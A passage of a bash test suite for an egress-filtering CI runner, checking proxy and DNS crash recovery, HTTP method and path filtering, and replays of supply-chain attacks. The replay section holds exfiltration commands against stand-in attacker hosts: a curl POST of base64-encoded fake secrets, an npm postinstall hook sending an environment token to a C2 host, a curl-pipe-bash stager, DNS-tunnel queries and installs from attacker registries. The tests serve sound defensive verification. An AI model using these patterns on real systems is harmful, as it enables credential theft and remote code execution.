  # (written once the proxy is running) since mark <m> says it is ready to take connections
  wait_proxy_ready() { local m=$1 i=0; while [ "$i" -lt 30 ]; do [ -n "$(flows_q "$m" '.ev=="start"' | head -1)" ] && return 0; sleep 1; i=$((i+1)); done; return 1; }

  before=$(openssl x509 -in "$CA" -noout -fingerprint -sha256 2>/dev/null | cut -d= -f2)
  code=$(gh_zen -o /dev/null -w '%{http_code}' 2>&1)
  [ "$code" = 200 ]; pass_if CR.pre-egress $? "api.github.com/zen -> $code before any kill; CA $before"

  # --- proxy SIGKILL ---
  p_r0=$(systemctl show -p NRestarts --value safer-runner-proxy)
  p_pid0=$(systemctl show -p MainPID --value safer-runner-proxy)
  m=$(mark)
  sudo -n systemctl kill -s KILL safer-runner-proxy
  wait_active safer-runner-proxy 30; pass_if CR.proxy-restarts $? "safer-runner-proxy active after SIGKILL; NRestarts $p_r0 -> $(systemctl show -p NRestarts --value safer-runner-proxy)"
  wait_proxy_ready "$m"; pass_if CR.proxy-ready $? "restarted proxy logged its start record (listeners up)"
  p_pid1=$(systemctl show -p MainPID --value safer-runner-proxy)
  [ -n "$p_pid1" ] && [ "$p_pid1" != 0 ] && [ "$p_pid1" != "$p_pid0" ]; pass_if CR.proxy-new-pid $? "MainPID $p_pid0 -> $p_pid1"
  # the public CA on disk (what clients were told to trust) is reused, not regenerated
  after=$(openssl x509 -in "$CA" -noout -fingerprint -sha256 2>/dev/null | cut -d= -f2)
  [ -n "$before" ] && [ "$before" = "$after" ]; pass_if CR.proxy-ca-stable $? "CA sha256 unchanged across restart ($after)"
  # egress recovers through the restarted proxy, still served by our CA
  code=$(gh_zen -o /dev/null -w '%{http_code}' 2>&1)
  issuer=$(echo | timeout 15 openssl s_client -connect api.github.com:443 -servername api.github.com 2>/dev/null | openssl x509 -noout -issuer 2>/dev/null)
  [ "$code" = 200 ] && grep -q safer-runner <<<"$issuer"; pass_if CR.proxy-egress-recovers $? "api.github.com/zen -> $code after restart; cert $issuer"
  # enforcement intact: a non-allowlisted SNI (forced to reach the proxy) is still blocked + logged
  expect_blocked CR.proxy-enforce-after "https://example.org (forced to \$ATTACKER_IP) after proxy restart" \
    '.ev=="tls" and .sni=="example.org" and .verdict=="BLOCK"' \
    curl -k -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "example.org:443:$ATTACKER_IP" https://example.org/

  # --- CoreDNS SIGKILL ---
  d_r0=$(systemctl show -p NRestarts --value safer-runner-dns)
  d_pid0=$(systemctl show -p MainPID --value safer-runner-dns)
  sudo -n systemctl kill -s KILL safer-runner-dns
  wait_active safer-runner-dns 30; pass_if CR.dns-restarts $? "safer-runner-dns active after SIGKILL; NRestarts $d_r0 -> $(systemctl show -p NRestarts --value safer-runner-dns)"
  d_pid1=$(systemctl show -p MainPID --value safer-runner-dns)
  [ -n "$d_pid1" ] && [ "$d_pid1" != 0 ] && [ "$d_pid1" != "$d_pid0" ]; pass_if CR.dns-new-pid $? "MainPID $d_pid0 -> $d_pid1"
  # an allowlisted name resolves again
  out=$(dig +short +time=3 +tries=2 @127.0.0.1 registry.npmjs.org A 2>&1)
  [ -n "$out" ]; pass_if CR.dns-allowed-resolves $? "dig registry.npmjs.org -> $(tr '\n' ' ' <<<"$out")"
  # default-deny survived the restart: a non-allowlisted name is still NXDOMAIN
  out=$(dig +time=3 +tries=2 @127.0.0.1 evil.example.org A 2>&1)
  grep -q 'status: NXDOMAIN' <<<"$out"; pass_if CR.dns-deny-after $? "dig evil.example.org -> $(grep -oE 'status: [A-Z]+' <<<"$out" | head -1)"

  # --- both at once ---
  m=$(mark)
  sudo -n systemctl kill -s KILL safer-runner-proxy safer-runner-dns
  { wait_active safer-runner-proxy 30 && wait_active safer-runner-dns 30 && wait_proxy_ready "$m"; }; pass_if CR.both-restart $? "proxy + dns both active (proxy listening) after a simultaneous SIGKILL"
  code=$(gh_zen -o /dev/null -w '%{http_code}' 2>&1)
  [ "$code" = 200 ]; pass_if CR.both-egress-recovers $? "api.github.com/zen -> $code after killing proxy+dns together"
}

# SC: real-world supply-chain attack REPLAYS. Each reproduces the behaviour of a named 2024-2025
# incident, run as the runner user AFTER enforce is applied (the real threat model). Every scenario
# uses a FAKE canary secret - never a real credential - and a SELF-CONTAINED sink: the attacker IP
# ($ATTACKER_IP, a real host not on any allowlist) or a name that is not on the allowlist (so DNS
# default-deny returns NXDOMAIN). We assert the exfil is stopped and the secret never leaves the VM;
# no third-party pastebin/webhook is contacted, so the suite stays deterministic. No sudo needed.
supply_chain() {
  local canary payload enc q_dis q_allow out rc victim pkg
  canary="sr-canary-$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')"
  export SR_CANARY="$canary"
  record SC.ctx INFO "threat model: malicious step as runner user after enforce; fake secret SR_CANARY=$canary (NOT a real credential); sinks=$ATTACKER_IP + non-allowlisted names"

  # SC1 - tj-actions/changed-files (Mar 2025): harvest CI secrets, base64-encode, exfiltrate. We
  # build a synthetic secrets blob (fake values only) as the compromised action did, then POST it
  # over TLS to an attacker host forced to the sink IP. The proxy must never open a connection out.
  payload=$(printf 'AWS_SECRET_ACCESS_KEY=%s\nGH_PAT=%s\nNPM_TOKEN=%s\n' "$canary" "$canary" "$canary" | base64 -w0)
  never_reached SC1.tj-actions "fake-secrets blob base64-exfiltrated over TLS to attacker [tj-actions/changed-files replay]" "$ATTACKER_IP" \
    curl -k -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "exfil.attacker.example:443:$ATTACKER_IP" \
      --data-binary "$payload" https://exfil.attacker.example/collect
  # same payload over plain HTTP with a disallowed Host (log-scrubbing variants used both)
  expect_blocked SC1b.tj-actions-http "fake-secrets blob exfiltrated over plain HTTP to disallowed Host [tj-actions replay]" \
    '.ev=="http" and .verdict=="BLOCK" and .host=="exfil.attacker.example"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "exfil.attacker.example:80:$ATTACKER_IP" \
      --data-binary "$payload" http://exfil.attacker.example/collect

  # SC2 - Shai-Hulud npm worm (Sep 2025): a package's postinstall script phones home to a hardcoded
  # C2 and exfiltrates tokens. Default-deny DNS means the hardcoded C2 never resolves, so the worm's
  # exfil step fails before a byte leaves. We install the malicious package into a throwaway project
  # with lifecycle scripts enabled, exactly as a transitive dependency would run.
  pkg=/tmp/sc-evil-pkg; victim=/tmp/sc-victim
  rm -rf "$pkg" "$victim"; mkdir -p "$pkg" "$victim"
  cat > "$pkg/package.json" <<JSON
{
  "name": "sc-evil-pkg",
  "version": "1.0.0",
  "scripts": { "postinstall": "node -e \"fetch('https://c2.shaihulud.attacker.example/steal',{method:'POST',body:process.env.SR_CANARY}).then(()=>process.exit(0)).catch(()=>process.exit(7))\"" }
}
JSON
  echo '{"name":"sc-victim","version":"1.0.0"}' > "$victim/package.json"
  out=$(cd "$victim" && npm install --foreground-scripts --no-audit --no-fund --no-package-lock --loglevel=error "$pkg" 2>&1); rc=$?
  sleep 0.5
  grep -q " BLOCK A c2.shaihulud.attacker.example. " /var/log/safer-runner/dns.log \
    && ! grep -q "c2.shaihulud.attacker.example. .*upstream=" /var/log/safer-runner/dns.log
  pass_if SC2.shai-hulud $? "postinstall C2 c2.shaihulud.attacker.example NXDOMAIN'd by default-deny DNS, never forwarded [Shai-Hulud npm worm replay]; npm rc=$rc ${out: -60}"

  # SC3 - curl | bash second-stage (codecov bash-uploader / xz-style staging): the first stage fetches
  # a script from a hardcoded host and pipes it to a shell. The fetch must fail (name unresolvable),
  # so the second stage - which would drop a marker file - never runs.
  rm -f /tmp/sc-stage2.marker
  # curl's stderr -> /dev/null so only the (empty, on failure) body reaches the shell, as `curl -s URL | bash` does
  out=$(curl -fsS -m 10 https://cdn.stager.attacker.example/stage2.sh 2>/dev/null | bash 2>&1); rc=$?
  sleep 0.5
  [ ! -e /tmp/sc-stage2.marker ] && grep -q " BLOCK A cdn.stager.attacker.example. " /var/log/safer-runner/dns.log
  pass_if SC3.curl-bash-stager $? "second-stage fetch from cdn.stager.attacker.example blocked, marker absent [curl|bash stager replay]; ${out: -60}"

  # SC4 - DNS tunnelling (SUNBURST-style): encode the secret into DNS labels and look them up, both
  # under a non-allowlisted zone AND under an ALLOWLISTED parent (objects.githubusercontent.com).
  # Exact-by-default means even a subdomain of an allowed name is NXDOMAIN and is never forwarded, so
  # the encoded secret never reaches any upstream resolver - no covert DNS data channel.
  enc=$(printf '%s' "$canary" | od -An -tx1 | tr -d ' \n')
  q_dis="${enc:0:28}.tunnel.attacker.example"
  q_allow="${enc:0:28}.objects.githubusercontent.com"
  out=$(dig +time=3 +tries=1 "$q_dis" A 2>&1 | grep -o 'status: [A-Z]*')
  [ "$out" = "status: NXDOMAIN" ]; pass_if SC4.dns-tunnel-disallowed $? "encoded secret under non-allowlisted zone -> $out [SUNBURST-style DNS tunnel]"
  out=$(dig +time=3 +tries=1 "$q_allow" A 2>&1 | grep -o 'status: [A-Z]*')
  [ "$out" = "status: NXDOMAIN" ]; pass_if SC4.dns-tunnel-allowed-parent $? "encoded secret under ALLOWED parent objects.githubusercontent.com -> $out (exact-by-default blocks it)"
  sleep 0.5
  grep -q " BLOCK A $q_allow. NXDOMAIN" /var/log/safer-runner/dns.log && ! grep -q "$q_allow. .*upstream=" /var/log/safer-runner/dns.log
  pass_if SC4.dns-tunnel-not-forwarded $? "the encoded-secret query under the allowed parent was NOT forwarded upstream (no DNS data channel)"

  # SC5 - dependency confusion (2021-onward, incl. 2024-25 npm/pypi campaigns): the build resolves an
  # internal-looking package from an attacker-chosen index/registry. That host is not on the allowlist,
  # so it never resolves and the malicious package cannot be fetched.
  out=$(python3 -m pip install --disable-pip-version-check --no-input --timeout 5 --retries 0 \
        --index-url https://pypi.internal-corp.attacker.example/simple/ evilcorp-internal-sdk 2>&1); rc=$?
  sleep 0.5
  { [ $rc -ne 0 ] && grep -q " BLOCK A pypi.internal-corp.attacker.example. " /var/log/safer-runner/dns.log; }
  pass_if SC5.pip-dependency-confusion $? "pip --index-url to attacker registry blocked (NXDOMAIN) [dependency-confusion replay]; rc=$rc ${out: -60}"
  out=$(npm install --no-audit --no-fund --no-package-lock --fetch-retries=0 --loglevel=error \
        --registry https://registry.internal-corp.attacker.example/ @internal-corp/private-sdk 2>&1); rc=$?
  sleep 0.5
  { [ $rc -ne 0 ] && grep -q " BLOCK A registry.internal-corp.attacker.example. " /var/log/safer-runner/dns.log; }
  pass_if SC5b.npm-dependency-confusion $? "npm --registry to attacker registry blocked (NXDOMAIN) [dependency-confusion replay]; rc=$rc ${out: -60}"

  # Aggregate: across every replay above, the proxy never opened a server connection to the attacker IP.
  rc=$(jq -c "select(.ev==\"server-connect\" and (.peername // \"\" | startswith(\"$ATTACKER_IP:\")))" "$FLOWLOG" 2>/dev/null | wc -l)
  [ "$rc" -eq 0 ]; pass_if SC.no-egress-to-sink $? "$rc proxy server-connects to $ATTACKER_IP across all replays (want 0)"
}

# ---------------------------------------------------------------- http-filter
# Method + path filtering on hosts that are already allowed (docs/DESIGN-L7-path-method.md in
# the action). Flow records of a filtered host carry .filter (allow|platform|block) and
# .filter_rule; a refusal has reason method-not-allowed or path-not-allowed.

# enforce job: http-filter (see suite.yml) =
#   api.github.com     { "*": GET, HEAD }
#   registry.npmjs.org { "*": GET, HEAD }
#   github.com         { "*": "*", "*/git-receive-pack": NONE, "portswigger-tim/srt-carveout/git-receive-pack": "*",
#                        "octocat/spoon-knife/*": NONE }
http_filter() {
  local out rc rec m form url br code p d
  rec=$(jq -c 'select(.ev=="start")' "$FLOWLOG" | tail -1)
  jq -e '.http_filter_hosts == 3 and .platform_auto_allowed == 0' <<<"$rec" >/dev/null
  pass_if HF.policy-loaded $? "proxy start record: $(jq -c '{http_filter_hosts, platform_auto_allowed}' <<<"$rec")"

  # API read-only
  expect_passed HF.api-get "GET api.github.com/zen" \
    '.host=="api.github.com" and .method=="GET" and .path=="/zen" and .filter=="allow" and .filter_rule=="*"' \
    gh_zen -w ' %{http_code}'
  expect_passed HF.api-head "HEAD api.github.com/" \
    '.host=="api.github.com" and .method=="HEAD" and .filter=="allow"' \
    curl -sS -m 15 -I -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/
  expect_blocked HF.api-post "POST api.github.com/markdown (a write)" \
    '.host=="api.github.com" and .method=="POST" and .verdict=="BLOCK" and .reason=="method-not-allowed" and .filter=="block" and .filter_rule=="*"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -d '{"text":"hi"}' https://api.github.com/markdown
  expect_blocked HF.api-gh-delete "gh api -X DELETE (a write via the gh CLI)" \
    '.host=="api.github.com" and .method=="DELETE" and .verdict=="BLOCK" and .reason=="method-not-allowed"' \
    gh api -X DELETE "repos/$GITHUB_REPOSITORY/git/refs/heads/srt-does-not-exist-$RANDOM"
  m=$(mark); out=$(curl -sS -m 15 -i -X PATCH -H "Authorization: Bearer $GH_TOKEN" -d '{}' "https://api.github.com/repos/$GITHUB_REPOSITORY" 2>&1)
  grep -qi '^x-safer-runner: blocked' <<<"$out" && grep -q 'method-not-allowed' <<<"$out"
  pass_if HF.refusal-response $? "PATCH answered by the proxy: $(head -1 <<<"$out" | tr -d '\r') / $(tail -1 <<<"$out")"

  # git: fetch and push are both POST, so the path separates them
  for form in dotgit plain; do
    url=https://github.com/octocat/Hello-World; [ $form = dotgit ] && url=$url.git
    rm -rf /tmp/hf-clone; out=$(git clone -q --depth 1 "$url" /tmp/hf-clone 2>&1)
    pass_if HF.git-clone-$form $? "git clone $url -> ${out:-ok $(git -C /tmp/hf-clone rev-parse --short HEAD 2>/dev/null)}"
  done
  out=$(git fetch -q --depth 1 origin 2>&1); pass_if HF.git-fetch $? "git fetch origin in the checkout -> ${out:-ok}"

  # A real push with the job token (contents: write, so git gets past discovery and sends the
  # git-receive-pack POST). No carve-out names this repo, so the filter must refuse it.
  br="srt-http-filter-probe-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT-$RANDOM"
  for form in dotgit plain; do
    url=https://github.com/$GITHUB_REPOSITORY; [ $form = dotgit ] && url=$url.git
    expect_blocked HF.git-push-$form "git push $url (no carve-out for this repo)" \
      '.host=="github.com" and .method=="POST" and (.path|endswith("/git-receive-pack")) and .verdict=="BLOCK" and .reason=="path-not-allowed" and .filter_rule=="*/git-receive-pack"' \
      git push "$url" "HEAD:refs/heads/$br-$form"
    out=$(git ls-remote "$url" "refs/heads/$br-$form" 2>&1)
    if [ -z "$out" ]; then record HF.git-push-$form-absent PASS "branch $br-$form does not exist on the remote"
    else record HF.git-push-$form-absent FAIL "branch was created: $out"; git push -q "$url" --delete "$br-$form" || true; fi
  done

  # The carve-out matches the repo with and without .git (unauthenticated POST: the filter lets
  # it through to GitHub, which answers 401/404 itself)
  for form in plain dotgit; do
    p=/portswigger-tim/srt-carveout; [ $form = dotgit ] && p=$p.git
    expect_passed HF.carveout-$form "POST github.com$p/git-receive-pack (carve-out portswigger-tim/srt-carveout)" \
      ".host==\"github.com\" and .path==\"$p/git-receive-pack\" and .filter==\"allow\" and .filter_rule==\"portswigger-tim/srt-carveout/git-receive-pack\"" \
      curl -sS -m 15 -i -X POST -H 'Content-Type: application/x-git-receive-pack-request' --data-binary '' "https://github.com$p/git-receive-pack"
  done

  # A repo-specific deny holds however the URL spells the repo (GitHub ignores case and .git)
  for url in https://github.com/octocat/Spoon-Knife https://github.com/octocat/Spoon-Knife.git https://github.com/OCTOCAT/spoon-knife.git; do
    rm -rf /tmp/hf-sk
    expect_blocked "HF.repo-deny-${url#https://github.com/}" "git clone $url (octocat/spoon-knife/* is NONE)" \
      '.host=="github.com" and .verdict=="BLOCK" and .reason=="path-not-allowed"' \
      git clone -q --depth 1 "$url" /tmp/hf-sk
  done

  # npm read-only: install yes, publish (PUT) no
  d=$(mktemp -d)
  out=$(npm install --prefix "$d" --no-audit --no-fund --loglevel=error left-pad 2>&1)
  pass_if HF.npm-install $? "npm install left-pad (GET) -> ${out:-ok $(jq -r .version "$d/node_modules/left-pad/package.json" 2>/dev/null)}"
  d=$(mktemp -d)
  printf '{"name":"srt-http-filter-probe-%s","version":"0.0.0"}\n' "$RANDOM$RANDOM" > "$d/package.json"
  printf '//registry.npmjs.org/:_authToken=npm_fakefakefakefakefakefakefakefakefake\n' > "$d/.npmrc"
  expect_blocked HF.npm-publish "npm publish (PUT registry.npmjs.org, fake token)" \
    '.host=="registry.npmjs.org" and .method=="PUT" and .verdict=="BLOCK" and .reason=="method-not-allowed"' \
    bash -c "cd '$d' && npm publish --registry https://registry.npmjs.org/ --userconfig '$d/.npmrc' --loglevel=error"

  # a non-standard method: refused, and the report never echoes the token (it can carry data)
  expect_blocked HF.custom-method "SRTCANARY7F3E9 request to api.github.com (GET/HEAD only)" \
    '.host=="api.github.com" and .method=="SRTCANARY7F3E9" and .verdict=="BLOCK" and .reason=="method-not-allowed"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' -X SRTCANARY7F3E9 https://api.github.com/zen

  render_report || return
  report_has HF.report-invalid-method '`INVALID`' "a non-standard method is shown as INVALID"
  ! grep -q SRTCANARY "$REPORT" "${REPORT%.md}.log"; pass_if HF.report-no-method-token $? "the method token appears nowhere in the report or the post-step log"
  report_has HF.report-refused '**Refused by `http-filter`**' "enforce report lists the refused requests"
  grep -qE '^\| ⛔ \| HTTP filter \| [0-9]+ requests? blocked: ' "$REPORT"
  pass_if HF.report-scorecard $? "the Summary scorecard has a blocked HTTP filter row: $(grep -m1 '| HTTP filter |' "$REPORT" | cut -c1-160)"
  # refused paths are never shown (the sender chose them; they can carry data): the refused
  # requests' canary path segments must not appear in the report or the post-step log
  report_has HF.report-path-hidden '‹path hidden›' "a refused request's path is shown as hidden"
  ! grep -qE 'srt-does-not-exist|srt-http-filter-probe' "$REPORT" "${REPORT%.md}.log"
  pass_if HF.report-no-refused-path $? "no refused path (DELETE …/srt-does-not-exist-*, npm PUT /srt-http-filter-probe-*) in the report or the post-step log"
  report_has HF.report-analyze-note "run it in analyze mode without that host's \`http-filter\` entry" "enforce report says how to allow a needed request"
}

# Platform hosts the runner and first-party actions talk to.
PLATFORM_HOSTS='^(results-receiver\\.actions\\.githubusercontent\\.com|productionresultssa[0-9]+\\.blob\\.core\\.windows\\.net|run-actions-.*\\.actions\\.githubusercontent\\.com)$'
# Optional platform endpoints: a job's own rule wins over them. Under a job's NONE on these hosts
# the job degrades but completes (validated on real runners): step status updates are refused
# (invisible: the jobs API still shows every step), step logs are refused (the job log is lost),
# artifact and cache fail.
OPTIONAL_PATHS='(WorkflowStepUpdateService|ArtifactService|CacheService)/|/logs/|/artifacts/|^/actions-cache/'

# Enforce jobs that filter platform hosts "*": NONE ($SPLIT says which; run-actions-*-azure-* is
# always "*": NONE too):
#   receiver: results-receiver.actions.githubusercontent.com
#   blob:     productionresultssa*.blob.core.windows.net
#   both:     both of them
# Essential (job lease and completion, OIDC, the step-log RPCs and live log stream) stays allowed;
# the rest is optional, so the job's NONE refuses it and the job degrades but completes - the
# verdict job in http-filter-platform-split.yml checks that each job closes without a hang.
http_filter_split() {
  local host
  # the run-actions host is filtered in every config; the OIDC token (GET */idtoken/*) is
  # essential there. Never print the token.
  expect_passed HS.oidc-token "OIDC token request (GET ACTIONS_ID_TOKEN_REQUEST_URL)" \
    '(.host|test("^run-actions-")) and .method=="GET" and (.path|test("/idtoken/")) and .filter=="platform"' \
    curl -sS -m 20 -f -o /dev/null -w '%{http_code}' -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=srt-http-filter"
  host=$(sed -E 's#^https://([^/]+)/.*#\1#' <<<"$ACTIONS_ID_TOKEN_REQUEST_URL")
  expect_blocked HS.oidc-host-filtered "GET https://$host/srt-probe (filter is live on the OIDC host)" \
    ".host==\"$host\" and .path==\"/srt-probe\" and .verdict==\"BLOCK\" and .reason==\"path-not-allowed\"" \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' "https://$host/srt-probe"
  if [ "$SPLIT" != blob ]; then
    expect_blocked HS.results-receiver-filtered "GET results-receiver /srt-probe" \
      '.host=="results-receiver.actions.githubusercontent.com" and .path=="/srt-probe" and .verdict=="BLOCK" and .reason=="path-not-allowed"' \
      curl -sS -m 15 -o /dev/null -w '%{http_code}' https://results-receiver.actions.githubusercontent.com/srt-probe
  fi
  if [ "$SPLIT" != receiver ]; then
    host=$(jq -r 'select(.host // "" | test("^productionresultssa[0-9]+\\.blob")) | .host' "$FLOWLOG" | head -1)
    host=${host:-productionresultssa0.blob.core.windows.net}
    expect_blocked HS.blob-filtered "GET $host/srt-probe" \
      ".host==\"$host\" and .path==\"/srt-probe\" and .verdict==\"BLOCK\" and .reason==\"path-not-allowed\"" \
      curl -sS -m 15 -o /dev/null -w '%{http_code}' "https://$host/srt-probe"
  fi
}

# After the artifact upload and cache save/restore steps ran under that filter.
http_filter_split_audit() {
  local rec refused n essential all
  if [ "$SPLIT" != blob ]; then
    rec=$(jq -c 'select(.verdict=="BLOCK" and .host=="results-receiver.actions.githubusercontent.com" and (.path|test("ArtifactService/")) and .filter=="block")' "$FLOWLOG" | head -1)
    [ -n "$rec" ]; pass_if HS.artifact-refused $? "artifact RPC refused by the job's NONE (optional platform entry yields): ${rec:-<none>}"
    rec=$(jq -c 'select(.verdict=="BLOCK" and .host=="results-receiver.actions.githubusercontent.com" and (.path|test("CacheService/")) and .filter=="block")' "$FLOWLOG" | head -1)
    [ -n "$rec" ]; pass_if HS.cache-refused $? "cache RPC refused by the job's NONE: ${rec:-<none>}"
    n=$(jq -c 'select(.filter=="platform" and .host=="results-receiver.actions.githubusercontent.com" and (.path|test("^/twirp/results\\.services\\.receiver\\.Receiver/")))' "$FLOWLOG" | wc -l)
    [ "$n" -gt 0 ]; pass_if HS.step-logs-allowed $? "$n step-log RPCs (Receiver/*) allowed as essential platform"
  fi
  n=$(jq -c 'select(.filter=="platform" and (.host|test("^run-actions-")) and (.path|endswith("/renewjob")))' "$FLOWLOG" | wc -l)
  [ "$n" -gt 0 ]; pass_if HS.renewjob-allowed $? "$n job-lease renewals allowed as essential platform"
  essential=$(jq -r '.http_filter.platform_auto_allowed // empty' /etc/safer-runner/policy.json 2>/dev/null)
  # with results-receiver refused too, artifact and cache stop at their RPCs before any blob upload
  if [ "$SPLIT" = blob ]; then
    rec=$(jq -c 'select(.verdict=="BLOCK" and (.host|test("^productionresultssa[0-9]+\\.blob")) and .method=="PUT" and (.path|test("/artifacts/")))' "$FLOWLOG" | head -1)
    [ -n "$rec" ]; pass_if HS.artifact-blob-refused $? "artifact blob upload refused by the job's NONE: ${rec:-<none>}"
    rec=$(jq -c 'select(.verdict=="BLOCK" and (.host|test("^productionresultssa[0-9]+\\.blob")) and (.path|startswith("/actions-cache/")))' "$FLOWLOG" | head -1)
    [ -n "$rec" ]; pass_if HS.cache-blob-refused $? "cache blob upload refused by the job's NONE: ${rec:-<none>}"
  fi
  # Only optional endpoints may be refused: anything else refused on a platform host (other than
  # our probe) is essential control plane the built-in list is missing.
  refused=$(jq -r "select(.filter==\"block\" and (.host // \"\" | test(\"$PLATFORM_HOSTS\")) and ((.path // \"\") | test(\"srt-probe|$OPTIONAL_PATHS\") | not)) | \"\(.method) \(.host) \(.path)\"" "$FLOWLOG" \
    | sed -E 's/[0-9a-f-]{16,}/*/g; s#/[0-9]+/#/N/#g' | sort | uniq -c | awk '{printf "%s %s %s(x%s); ", $2, $3, $4, $1}')
  [ -z "$refused" ]; pass_if HS.only-optional-refused $? "essential requests refused: ${refused:-none}"
  # the documented degradation, as expected refusals per config
  if [ "$SPLIT" != blob ]; then
    n=$(jq -c 'select(.filter=="block" and .host=="results-receiver.actions.githubusercontent.com" and (.path|test("WorkflowStepUpdateService/")))' "$FLOWLOG" | wc -l)
    record HS.degraded-step-status INFO "$n step status updates refused (optional; the jobs API still shows each step's conclusion)"
  fi
  if [ "$SPLIT" != receiver ]; then
    n=$(jq -c 'select(.filter=="block" and (.host|test("^productionresultssa[0-9]+\\.blob")) and (.path|test("/logs/")))' "$FLOWLOG" | wc -l)
    [ "$n" -gt 0 ]; pass_if HS.degraded-step-logs $? "$n step-log uploads refused (optional: this job's own log is lost, the job still completes)"
  fi
  # every refused platform request, as an annotation too (this job's own log upload may be refused)
  all=$(jq -r "select(.filter==\"block\" and (.host // \"\" | test(\"$PLATFORM_HOSTS\")) and ((.path // \"\") | test(\"srt-probe\") | not)) | \"\(.method) \(.host) \(.path)\"" "$FLOWLOG" \
    | sed -E 's/[0-9a-f-]{16,}/*/g; s#/[0-9]+/#/N/#g' | sort | uniq -c | awk '{printf "%s %s %s(x%s); ", $2, $3, $4, $1}')
  record HS.refused-platform INFO "${all:-none}"
  echo "::notice title=HS refused platform requests ($SPLIT)::${all:-none}"
  if [ -n "${essential:-}" ]; then
    render_report || return
    report_has HS.report-platform "$essential GitHub platform endpoints auto-allowed" "report shows the essential platform count"
  fi
}

# enforce job, allow-github-platform: false; productionresultssa*.blob.core.windows.net
# { "*": "*", "actions-cache/*": NONE }: with no platform list the cache upload is refused.
http_filter_no_platform() {
  local rec
  rec=$(jq -c 'select(.ev=="start")' "$FLOWLOG" | tail -1)
  jq -e '.http_filter_hosts == 1 and .platform_auto_allowed == 0' <<<"$rec" >/dev/null
  pass_if HN.platform-off $? "proxy start record: $(jq -c '{http_filter_hosts, platform_auto_allowed}' <<<"$rec")"
}

http_filter_no_platform_audit() {
  local rec
  rec=$(jq -c 'select(.verdict=="BLOCK" and (.host|endswith(".blob.core.windows.net")) and .method=="PUT" and (.path|startswith("/actions-cache/")) and .reason=="path-not-allowed" and .filter_rule=="actions-cache/*")' "$FLOWLOG" | head -1)
  [ -n "$rec" ]; pass_if HN.cache-upload-refused $? "cache blob PUT refused with the platform list off: ${rec:-<none>}"
  rec=$(jq -c 'select(.filter=="platform")' "$FLOWLOG" | head -1)
  [ -z "$rec" ]; pass_if HN.no-platform-allows $? "no request allowed as platform: ${rec:-none}"
}

# The suggested http-filter value (the input's YAML: host -> path -> methods) from $REPORT:
# the `http-filter` input of the Suggested Enforce Configuration block, or, when the job sets
# none, the optional block under it. Empty when there is none.
suggested_http_filter() {
  local section v
  section=$(sed -n '/^## 🔧 Suggested Enforce Configuration$/,/^# 🔎 Detail$/p' "$REPORT")
  v=$(awk '/^```yaml$/{f=1;next} /^```$/{if(f)exit} f' <<<"$section" | yq '.[0].with["http-filter"] // ""' 2>/dev/null)
  if [ -z "$v" ]; then
    v=$(sed -n '/<summary>Optional: narrow the allowed hosts further with <code>http-filter<\/code>/,/<\/details>/p' <<<"$section" \
      | awk '/^```yaml$/{f=1;next} /^```$/{if(f)exit} f' | yq '.["http-filter"] // ""' 2>/dev/null)
  fi
  printf '%s' "$v"
}

# analyze job, http-filter: api.github.com { "*": GET, HEAD }; github.com { "*": "*", "*/git-receive-pack": NONE }
http_filter_analyze() {
  expect_passed HZ.api-post-would-block "POST api.github.com/markdown (analyze: allowed, logged)" \
    '.host=="api.github.com" and .method=="POST" and .verdict=="WOULD_BLOCK" and .reason=="method-not-allowed" and .filter=="block"' \
    curl -sS -m 15 -f -X POST -H "Authorization: Bearer $GH_TOKEN" -d '{"text":"hi"}' https://api.github.com/markdown
  expect_passed HZ.push-would-block "POST github.com/octocat/Hello-World.git/git-receive-pack (unauthenticated)" \
    '.host=="github.com" and (.path|endswith("/git-receive-pack")) and .verdict=="WOULD_BLOCK" and .reason=="path-not-allowed"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: application/x-git-receive-pack-request' --data-binary '' https://github.com/octocat/Hello-World.git/git-receive-pack
  expect_passed HZ.api-get "GET api.github.com/zen" '.host=="api.github.com" and .method=="GET" and .filter=="allow"' gh_zen
  expect_passed HZ.custom-method "SRTCANARY7F3E9 request to api.github.com (analyze: logged)" \
    '.host=="api.github.com" and .method=="SRTCANARY7F3E9" and .verdict=="WOULD_BLOCK"' \
    curl -sS -m 15 -o /dev/null -w '%{http_code}' -X SRTCANARY7F3E9 https://api.github.com/zen
  render_report || return
  report_has HZ.report-invalid-method '`INVALID`' "a non-standard method is shown as INVALID"
  ! grep -q SRTCANARY "$REPORT" "${REPORT%.md}.log"; pass_if HZ.report-no-method-token $? "the method token appears nowhere in the report or the post-step log"
  # the suggested http-filter: in the Suggested Enforce Configuration block when the job sets
  # one, else the optional <details> under it (render_report passes no INPUT_HTTP-FILTER)
  local sug
  sug=$(suggested_http_filter)
  [ -n "$sug" ]; pass_if HZ.report-suggested $? "analyze report suggests an http-filter: $(head -c 200 <<<"$sug" | tr '\n' ' ')"
  [ -n "$sug" ] && ! grep -q 'INVALID' <<<"$sug"
  pass_if HZ.suggestion-no-invalid $? "the suggested http-filter has no INVALID method"
  grep -q '^api\.github\.com:' <<<"$sug"
  pass_if HZ.report-suggested-api $? "suggestion covers api.github.com: $(grep -A3 '^api.github.com:' <<<"$sug" | tr '\n' ' ' | cut -c1-200)"
  report_has HZ.report-refused '**Would be refused by `http-filter`**' "analyze report lists what the filter would refuse"
  grep -qE '^\| 🟠 \| HTTP filter \| [0-9]+ requests? would be blocked: ' "$REPORT"
  pass_if HZ.report-would-block $? "labelled as would-be-blocked in the scorecard: $(grep -m1 '| HTTP filter |' "$REPORT" | cut -c1-160)"
}

# enforce job: a broad github.com baseline with repo-specific push denies:
#   github.com { "*": "*", "portswigger-tim/safer-runner-action-test/git-receive-pack": NONE,
#                "srt/x/git-receive-pack": NONE }
# A real push with the job token (contents: write) to the denied repo must be refused however the
# URL spells the repo, over HTTP/1.1 and HTTP/2; equivalent spellings of the path too.
http_filter_git_deny() {
  local out form url br ver rp p sel enc
  for form in dotgit plain; do
